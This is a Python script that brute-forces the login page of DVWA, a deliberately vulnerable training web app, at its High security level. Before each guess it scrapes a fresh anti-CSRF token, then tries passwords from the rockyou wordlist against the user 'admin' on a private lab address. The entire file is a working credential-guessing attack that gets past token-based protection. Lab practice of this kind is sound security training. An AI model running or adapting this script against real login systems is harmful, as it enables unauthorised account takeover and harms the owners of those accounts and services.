#!/usr/bin/env python3
"""
Brute-force script with CSRF token extraction for DVWA High security
Save as: brute_dvwa_high.py
"""
import requests, re, sys

TARGET   = "http://192.168.56.104/dvwa/vulnerabilities/brute/"
SESSION_ID = "REPLACE_WITH_YOUR_PHPSESSID"   # Get from browser cookies

session = requests.Session()
session.cookies.update({"PHPSESSID": SESSION_ID, "security": "high"})

def get_token():
    r = session.get(TARGET)
    tokens = re.findall(r'user_token[^>]*value=["\']([a-f0-9]+)["\']', r.text)
    return tokens[0] if tokens else None

wordlist_path = "/usr/share/wordlists/rockyou.txt"
username = "admin"

try:
    with open(wordlist_path, "r", errors="ignore") as wl:
        for line in wl:
            password = line.strip()
            if not password:
                continue
            token = get_token()
            if not token:
                print("[-] Could not get CSRF token — check session ID")
                sys.exit(1)
            params = {
                "username": username,
                "password": password,
                "Login": "Login",
                "user_token": token
            }
            r = session.get(TARGET, params=params)
            if "Welcome to the password protected area" in r.text:
                print(f"[+] SUCCESS! Username: {username}  Password: {password}")
                sys.exit(0)
            else:
                print(f"[-] Failed: {password}")
except KeyboardInterrupt:
    print("\n[!] Interrupted by user")
